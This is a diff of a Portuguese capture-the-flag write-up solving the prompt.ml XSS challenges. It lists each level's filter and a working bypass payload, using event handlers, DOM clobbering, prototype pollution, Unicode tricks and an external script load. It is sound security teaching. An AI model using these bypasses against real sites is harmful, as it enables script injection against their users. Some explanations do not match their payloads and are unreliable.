@@ -1,13 +1,27 @@
-# Prompt.ml
+# Write-up: Desafios XSS em prompt.ml
 
-###### Solved by @Cubano2
-> This is a CTF about 
+> Resolvido por **@Cubano2**
 
-## About the Challenge  
-Aqui neste write-up se encontra as respostas do site [prompt.ml](https://prompt.ml/0)  
+---
 
-Nesse site tem desafios de XSS que ensinam sobre a gente sobre os tipos de vulnerabilidade em aplicação web e em navegadores.
-O navegador usado neste write-up foi o Microsof Edge e o Firefox
+## Introdução
+
+Este documento apresenta uma análise técnica dos desafios de XSS disponíveis em [prompt.ml](https://prompt.ml/0). Cada nível aplica um mecanismo distinto de filtragem/escape de entrada e requer uma técnica específica de bypass. Os testes foram realizados em **Microsoft Edge** e **Mozilla Firefox**.
+
+---
+
+## Ambiente e Ferramentas
+
+- **Navegadores**: Microsoft Edge, Mozilla Firefox  
+- **Ferramentas**: DevTools (Console, Network), proxies HTTP (opcional)
+
+---
+
+## Metodologia
+
+1. **Inspeção do filtro** – Identificar expressões regulares ou transformações aplicadas ao `input`.  
+2. **Construção do payload** – Dividir e codificar trechos para contornar cada restrição.  
+3. **Teste e refinamento** – Ajustar o payload até que o script seja executado automaticamente.
 
 ## level 0
 ```Js
@@ -17,8 +31,9 @@ function escape(input) {
     return '<input type="text" value="' + input + '">';
 }        
 ```
-O level 0 é bem tranquilo, com uma simples HTML injection consguimos passar dele.
-level 0 ```"><script>prompt(1)</script>```
+Filtro: nenhum (concatenação direta no atributo value).
+Resposta: `"><script>prompt(1)</script>`
+
 
 ## level 1
 ```javascript
@@ -31,9 +46,10 @@ function escape(input) {
     return '<article>' + input + '</article>';
 }        
 ```
-level 1 ```<img src=1 onerror='prompt(1)'```
+Filtro: remoção de <…> ou </…> via regex.
+Respota: ```<img src=1 onerror='prompt(1)'```
 
-O level 1 coloca um nível de dificuldade a mais fazendo a gente burlar um regex que tem no código. A regex `/<\/?[^>]+>/gi` procura por `<…>` ou `</…>` e remove tudo entre os colchetes. Nisso ela espera um `>` no final. Contornando isso conseguimos passar.
+Usamos o elemento <img> com atributo onerror, que não é capturado pela regex de remoção de tags.
 
 ## level 2
 ```javascript
@@ -46,7 +62,8 @@ function escape(input) {
     return input;
 }        
 ```
-level 2 ```<svg><script>prompt&#40;1)</script>```
+filtro: remoção de = e (.
+Resposta: ```<svg><script>prompt&#40;1)</script>```
 
 Para contornar o filtro que remove `=` e `()`, usamos a entidade HTML ```&#40;``` no lugar do parêntese e evitamos o sinal de igual.
 
@@ -60,7 +77,8 @@ function escape(input) {
     return '<!-- ' + input + ' -->';
 }            
 ```
-Level 3 ```--!><svg/onload=prompt(1)```
+Filtro: substitui -> por _, impedindo o término de comentário -->.
+Resposta: ```--!><svg/onload=prompt(1)```
 
 Para contornar o filtro (que remove ->), usamos o fechamento alternativo de comentário --!> definido no HTML5, fechamos o comentário e em seguida executamos o vetor SVG.
 
@@ -75,11 +93,11 @@ function escape(input) {
     return '<input value="' + input + '" type="text">';
 }                   
 ```
-Level 5 ```"type=image src onerror
+Filtro: remove >, qualquer atributo on...= e a palavra focus.
+Resposta ```"type=image src onerror
 ="prompt(1) ```
 
-
-Neste nivel para contornar o filtro (que remove `>`, qualquer `on…=` e a palavra `focus`), exploramos o fato de que quebras de linha também separam atributos. Assim, escapamos do atributo atual e injetamos um handler
+Utilizamos quebras de linha para separar atributos, encerrando `value="` e injetando `type="image"`, `src vazio` e `onerror="prompt(1)"` em linhas distintas.
 
 
 ## level 6
@@ -117,9 +135,10 @@ function escape(input) {
     }
 }                         
 ```
-Level 6  ```javascript:prompt(1)#{"action":1}```
+Filtro: bloqueia URIs `javascript:`, `vbscript:`, `data:` em `action`.
+Resposta:  ```javascript:prompt(1)#{"action":1}```
 
-Para burlar o filtro que bloqueia javascript:, vbscript: e URIs data:, exploramos o DOM clobbering criando um `<input name="action">` via JSON após o #, de modo que `document.forms[0].action` passa no teste e dispara nosso payload.
+Usamos a técnica de DOM clobbering: ao passar `{"action":1}` via JSON, criamos um `<input name="action">`, sobrescrevendo `form.action` para algo seguro que passe no teste e dispare `prompt(1)`.
 
 ## level 7
 ```javascript
@@ -132,12 +151,12 @@ function escape(input) {
     }).join('\n');
 }       
 ```
-Level 7 `"><svg/a=#"onload='/*#*/prompt(1)'`
+Filtro: Divide em segmentos por `#`, limita cada segmento a 12 caracteres e envolve em `<p title="…">`.
 
-Neste nível, o filtro faz três coisas: 1) divide a entrada em segmentos separados por #; 2) limita cada segmento a 12 caracteres; 3) envolve cada segmento num <p class="comment" title="…"></p>.
-Para burlar isso, no primeiro segmento usamos "> para fechar o atributo title e a tag <p>, em seguida abrimos nosso próprio <svg> e iniciamos um atributo “junk” (a=).
-No segundo segmento, fechamos o atributo junk ("), abrimos o evento onload= e usamos /* para encapsular o conteúdo indesejado que virá antes de alcançar o terceiro segmento.
-No terceiro segmento, fechamos o comentário JS (*/) e finalmente chamamos prompt(1), completando o payload.
+Resposta: `"><svg/a=#"onload='/*#*/prompt(1)'`
+
+Primeiro segmento: `">` fecha o `title` e a tag `<p>`. Segundo segmento: inicia atributo `a=` e abre `onload='/*`. Terceiro segmento: fecha comentário `*/` e chama `prompt(1)`.
+
 
 
 ## level 8
@@ -153,10 +172,11 @@ function escape(input) {
 </script> ';
 }        
 ```
-Level 8 ` prompt(1) -->`
+Filtro: remove quebras de linha, `<`, `/`, `"`.
 
-Neste nível, o payload faz duas coisas principais: 1) insere um espaço antes do prompt para evitar problemas de concatenação; 2) encerra o comentário JS com -->. Isso é feito porque a sequência --> é interpretada como o fim de um comentário no código JavaScript, mesmo em navegadores que são permissivos em relação a isso, permitindo que o restante do código seja executado sem interferências.
+Resposta: ` prompt(1) -->`
 
+Inserimos um espaço antes de prompt(1) e usamos --> para encerrar o comentário JS, liberando a chamada a console.log (ou prompt, se ajustado).
 
 
 ## level 9
@@ -171,7 +191,10 @@ function escape(input) {
     return '<h1>' + input + '</h1>';
 }       
 ```
-Level 9 `<ſcript/src=http://localhost:8000/test.js></ſcript>`
+
+Filtro: Substitui `<X` por `<_X`. Converte todos os caracteres para MAIÚSCULAS.
+
+Resposta: `<ſcript/src=http://localhost:8000/test.js></ſcript>`
 
 Neste nível, podemos observar que a entrada do usuário é tratada por “_” e também é feita a conversão de minúsculas para maiúsculas. Para contornar isso, podemos criar um payload utilizando alguns caracteres UNICODE da internet e, além disso, precisamos criar um arquivo JavaScript contendo o texto `prompt(1)`. Com isso só colocar no site a resposta desse level que conseguimos passar de nível.
 
@@ -189,7 +212,10 @@ function escape(input) {
     return '<script>' + input + '</script> ';
 }
 ```
-Level A `p'rompt(1)`
+
+Filtro: `encodeURIComponent` + troca de `prompt` por `alert`. Remove aspas simples `'`.
+
+Resposta: `p'rompt(1)`
 
 O nível A (10) é um dos mais fáceis de resolver neste desafio. Existem duas expressões regulares a serem contornadas: a primeira remove todas as ocorrências da palavra-chave `prompt`, enquanto a segunda remove todas as aspas simples `'`. Para contornar a primeira expressão regular, basta usar uma aspa simples para dividir a palavra-chave `prompt` em `pr'ompt`, o que claramente não é uma instrução JavaScript válida. Mas não se preocupe, a segunda expressão regular removerá o caractere invasor `'`, retornando um vetor de ataque válido!
 
@@ -211,9 +237,11 @@ function escape(input) {
 </script> ';
 }
 ```
-Level B `"(prompt(1))in"`
+Filtro: proíbe caracteres especiais `em memberName`.
 
-O nível B (11) nos permite injetar diretamente no que será o corpo de um elemento `script`. No entanto, antes de fazer isso, a string que podemos influenciar passa por um filtro rigoroso e não podemos injetar operadores ou outros elementos da linguagem que permitam uma fácil concatenação e injeção de payload. A solução aqui é usar um operador alfanumérico - ou seja, um operador que não nos obrigue a usar os caracteres especiais proibidos. Bem, existem vários desses e um que podemos é o operador `in`.
+Resposta: `"(prompt(1))in"`
+
+Usamos o operador alfanumérico `in` como parte do payload para injetar uma expressão válida em JavaScript sem usar símbolos proibidos.
 
 
 ## level C
@@ -228,9 +256,11 @@ function escape(input) {
     return '<script>' + input + '</script> ';
 }        
 ```
-level C `eval(0x258da033.toString(30))(1)`
+Filtro: `encodeURIComponent` + troca de `prompt` por `alert`.
 
-O nível C (12) tem um novo nível de dificuldade por conta do `encodeURIComponent` pois essa função faz com que caracteres como `/ ?` e outros que sejam condificados com URL e impossibilitando usarmos payloads que usamos nos níveis anteriores.Porém um jeito de contornar isso é simplesmente escrever o payload em outra base, como por exemplo hexadecimal. Por conta disso temos que usar `0x258da033.toString` onde `0x258da033` passado pra string fica `prompt` e assim burlando o filtro do level, fazendo a função `eval` chamar prompt por meio da base em hexadecimal e no final adicionar o `(1)`.
+Resposta: `eval(0x258da033.toString(30))(1)`
+
+O nível C (12) tem um novo nível de dificuldade por conta do `encodeURIComponent` pois essa função faz com que caracteres como `/ ?` e outros que sejam condificados com URL e impossibilitando usarmos payloads que usamos nos níveis anteriores. Porém um jeito de contornar isso é simplesmente escrever o payload em outra base, como por exemplo hexadecimal. Por conta disso temos que usar `0x258da033.toString` onde `0x258da033` passado pra string fica `prompt` e assim burlando o filtro do level, fazendo a função `eval` chamar prompt por meio da base em hexadecimal e no final adicionar o `(1)`.
 
 ## level D
 ```javascript
@@ -268,7 +298,9 @@ O nível C (12) tem um novo nível de dificuldade por conta do `encodeURICompone
     }
 }
 ```
-level D ```{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}```
+Filtro: Remove `source` inválido. Strip de aspas em `config.source`.
+
+Resposta ```{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}```
  
 Nesse nível devemos enviar um JSON com um source propositalmente inválido e um outro dentro de `__proto__`. O filtro remove o source inválido, sobrando só o do protótipo. Usa o poder de herança pra “injetar” código onde antes só era permitido texto simples. Finalmente, engana o .replace(/"/g,'') usando o $`` do replace, montando um onerror` sem precisar de aspas.
 
@@ -289,6 +321,8 @@ function escape(input) {
     }).join('\n');
 }
 ```
-level F
+Filtro: remove `*`, segmenta a entrada por `#` e limita cada título a 15 caracteres.
+
+Resposta: `"><script>#${prompt(1)}#</script>`
 
 Neste nivel temos que dividir o payload em pedaços separados por #, cada pedaço vira um <p> com atributo title. O primeiro pedaço (">) fecha o <p>, liberando o resto do texto para inserir tags de verdade. Os comentários HTML dentro de <svg> e <script> servem para “esconder” os atributos gerados automaticamente, garantindo que apenas o prompt(1) seja executado.
